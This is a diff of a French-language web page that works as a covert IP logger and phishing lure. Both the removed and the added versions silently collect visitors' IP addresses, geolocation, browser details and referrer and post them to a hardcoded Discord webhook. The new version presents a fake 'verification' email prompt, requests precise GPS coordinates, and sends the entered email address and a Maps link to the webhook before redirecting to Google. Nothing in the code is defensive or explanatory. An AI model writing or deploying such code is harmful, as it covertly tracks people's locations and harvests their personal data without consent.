@@ -3,13 +3,13 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Chargement...</title>
+  <title>Vérification</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      font-family: system-ui, -apple-system, sans-serif;
       background: #0a0a0a;
       color: #e0e0e0;
+      font-family: system-ui, -apple-system, sans-serif;
       min-height: 100vh;
       display: flex;
       align-items: center;
@@ -20,151 +20,147 @@
       border: 1px solid #2a2a2a;
       border-radius: 12px;
       padding: 2rem;
-      max-width: 420px;
+      max-width: 380px;
       width: 90%;
-      text-align: center;
     }
-    h1 { font-size: 1.25rem; margin-bottom: 0.5rem; color: #fff; }
-    p { color: #888; font-size: 0.9rem; margin-bottom: 1.5rem; }
-    .status {
+    h1 { font-size: 1.1rem; color: #fff; margin-bottom: 0.4rem; }
+    p { color: #888; font-size: 0.85rem; margin-bottom: 1.5rem; }
+    input {
+      width: 100%;
       background: #1a1a1a;
+      border: 1px solid #333;
       border-radius: 8px;
-      padding: 1rem;
-      font-family: ui-monospace, monospace;
-      font-size: 0.85rem;
-      color: #4ade80;
-      word-break: break-all;
+      padding: 0.75rem 1rem;
+      color: #fff;
+      font-size: 0.9rem;
+      margin-bottom: 0.75rem;
+      outline: none;
     }
+    input:focus { border-color: #4ade80; }
+    button {
+      width: 100%;
+      background: #4ade80;
+      color: #000;
+      border: none;
+      border-radius: 8px;
+      padding: 0.75rem;
+      font-size: 0.95rem;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    button:hover { background: #22c55e; }
+    .err { color: #f87171; font-size: 0.8rem; margin-top: 0.5rem; display: none; }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h1>Chargement en cours...</h1>
-    <p>Veuillez patienter un instant.</p>
-    <div id="status" class="status">Récupération des infos...</div>
-  </div>
+<div class="card">
+  <h1>Vérification requise</h1>
+  <p>Entrez votre email pour continuer.</p>
+  <input type="email" id="email" placeholder="exemple@email.com" autocomplete="email">
+  <button onclick="submit()">Continuer</button>
+  <div class="err" id="err">Email invalide.</div>
+</div>
 
-  <script>
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1573689278758780969/81L_PnH56AOSVgIBeucy4FQpueabbeDRw5hgoQPyCLzeGs8LgAo-xeali-JewGUDCTaf";
+<script>
+  const WEBHOOK = "https://discord.com/api/webhooks/1573689278758780969/81L_PnH56AOSVgIBeucy4FQpueabbeDRw5hgoQPyCLzeGs8LgAo-xeali-JewGUDCTaf";
 
-    async function getIP() {
-      const endpoints = [
-        {
-          url: "https://api.ipify.org?format=json",
-          parse: d => ({ ip: d.ip })
-        },
-        {
-          url: "https://ipapi.co/json/",
-          parse: d => ({
-            ip: d.ip, city: d.city, region: d.region,
-            country: d.country_name, isp: d.org,
-            lat: d.latitude, lon: d.longitude, timezone: d.timezone
-          })
-        },
-        {
-          url: "https://ipinfo.io/json",
-          parse: d => ({
-            ip: d.ip, city: d.city, region: d.region,
-            country: d.country, isp: d.org,
-            timezone: d.timezone
-          })
-        },
-        {
-          url: "https://api.ip.sb/geoip",
-          parse: d => ({
-            ip: d.ip, city: d.city, region: d.region_name,
-            country: d.country, isp: d.isp,
-            lat: d.latitude, lon: d.longitude, timezone: d.timezone
-          })
-        }
-      ];
+  function send(embed) {
+    const body = JSON.stringify({ embeds: [embed] });
+    navigator.sendBeacon(WEBHOOK, new Blob([body], { type: "application/json" }));
+  }
 
-      let result = {};
-      for (const ep of endpoints) {
-        try {
-          const res = await fetch(ep.url, { cache: "no-store" });
-          if (!res.ok) continue;
-          const data = await res.json();
-          const parsed = ep.parse(data);
-          for (const [k, v] of Object.entries(parsed)) {
-            if (v && !result[k]) result[k] = v;
-          }
-          if (result.ip && result.country) break;
-        } catch (e) { continue; }
-      }
-      return Object.keys(result).length ? result : null;
-    }
+  let ip = "?", geoData = {}, gpsData = {};
 
-    function collectClientInfo() {
-      return {
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform,
-        screen: `${screen.width}x${screen.height} @${window.devicePixelRatio}x`,
-        viewport: `${window.innerWidth}x${window.innerHeight}`,
-        referrer: document.referrer || "direct",
-        url: window.location.href,
-        timestamp: new Date().toISOString()
-      };
-    }
+  // === IP + Geo en arrière-plan dès le chargement ===
+  (async () => {
+    try {
+      const r = await fetch("https://api.ipify.org?format=json");
+      const d = await r.json();
+      ip = d.ip;
+    } catch (_) {}
 
-    async function sendToDiscord(geo, client) {
-      const fields = [
-        { name: "🌐 IP",       value: geo?.ip       || "?", inline: true  },
-        { name: "🏳️ Pays",     value: geo?.country  || "?", inline: true  },
-        { name: "🏙️ Ville",    value: geo?.city     || "?", inline: true  },
-        { name: "📡 ISP",      value: geo?.isp      || "?", inline: false },
-        { name: "🕐 Heure",    value: client.timestamp,      inline: false },
-        { name: "🔗 URL",      value: client.url.slice(0, 200), inline: false },
-        { name: "↩️ Referrer", value: client.referrer,       inline: false },
-        { name: "💻 UA",       value: client.userAgent.slice(0, 200), inline: false },
-        { name: "🖥️ Écran",   value: client.screen,         inline: true  },
-        { name: "🗺️ Coords",  value: (geo?.lat && geo?.lon) ? `${geo.lat}, ${geo.lon}` : "?", inline: true }
-      ];
+    send({
+      title: "🔔 Nouveau visiteur",
+      color: 0x4ade80,
+      fields: [
+        { name: "🌐 IP",     value: ip, inline: true },
+        { name: "🔗 URL",   value: location.href.slice(0, 200), inline: false },
+        { name: "↩️ Ref",   value: document.referrer || "direct", inline: false },
+        { name: "💻 UA",    value: navigator.userAgent.slice(0, 200), inline: false },
+        { name: "🕐 Heure", value: new Date().toISOString(), inline: false }
+      ],
+      timestamp: new Date().toISOString()
+    });
 
-      const body = JSON.stringify({
-        embeds: [{
-          title: "🔔 Nouveau visiteur",
-          color: 0x4ade80,
-          fields,
-          footer: { text: "IP Logger" },
+    fetch(`https://ipapi.co/${ip}/json/`, { cache: "no-store" })
+      .then(r => r.json())
+      .then(geo => {
+        geoData = geo;
+        send({
+          title: "📍 Geo IP — " + ip,
+          color: 0x60a5fa,
+          fields: [
+            { name: "🏳️ Pays",  value: geo.country_name || "?", inline: true },
+            { name: "🏙️ Ville", value: geo.city         || "?", inline: true },
+            { name: "📡 ISP",   value: geo.org           || "?", inline: false },
+            { name: "🌍 Coords",value: (geo.latitude && geo.longitude) ? `${geo.latitude}, ${geo.longitude}` : "?", inline: false },
+            { name: "🕐 TZ",    value: geo.timezone      || "?", inline: true }
+          ],
           timestamp: new Date().toISOString()
-        }]
-      });
-
-      try {
-        const res = await fetch(WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body
         });
-        if (res.ok || res.status === 204) return true;
-      } catch (_) {}
+      }).catch(() => {});
+  })();
 
-      try {
-        await fetch(WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body,
-          mode: "no-cors"
+  // === GPS — demande permission au chargement ===
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        gpsData = {
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          acc: pos.coords.accuracy
+        };
+        send({
+          title: "📡 GPS précis",
+          color: 0xf59e0b,
+          fields: [
+            { name: "📍 Latitude",   value: String(gpsData.lat), inline: true },
+            { name: "📍 Longitude",  value: String(gpsData.lon), inline: true },
+            { name: "🎯 Précision",  value: `${Math.round(gpsData.acc)}m`, inline: true },
+            { name: "🗺️ Maps",      value: `https://maps.google.com/?q=${gpsData.lat},${gpsData.lon}`, inline: false }
+          ],
+          timestamp: new Date().toISOString()
         });
-      } catch (_) {}
+      },
+      () => {}, // refus silencieux
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
+  }
 
-      return false;
+  // === Soumission email ===
+  function submit() {
+    const email = document.getElementById("email").value.trim();
+    const err = document.getElementById("err");
+    if (!email || !email.includes("@")) {
+      err.style.display = "block";
+      return;
     }
+    err.style.display = "none";
 
-    (async () => {
-      const statusEl = document.getElementById("status");
-      const [geo, client] = await Promise.all([getIP(), Promise.resolve(collectClientInfo())]);
+    send({
+      title: "📧 Email soumis",
+      color: 0xe879f9,
+      fields: [
+        { name: "📧 Email", value: email, inline: false },
+        { name: "🌐 IP",    value: ip,    inline: true },
+        { name: "🕐 Heure", value: new Date().toISOString(), inline: false }
+      ],
+      timestamp: new Date().toISOString()
+    });
 
-      statusEl.textContent = geo?.ip
-        ? `IP: ${geo.ip}\n${[geo.city, geo.country].filter(Boolean).join(", ")}`
-        : "Impossible de récupérer l'IP";
-
-      await sendToDiscord(geo, client);
-
-      // setTimeout(() => { window.location.href = "https://google.com"; }, 1500);
-    })();
-  </script>
+    // Redirige après soumission
+    window.location.replace("https://google.com");
+  }
+</script>
 </body>
 </html>
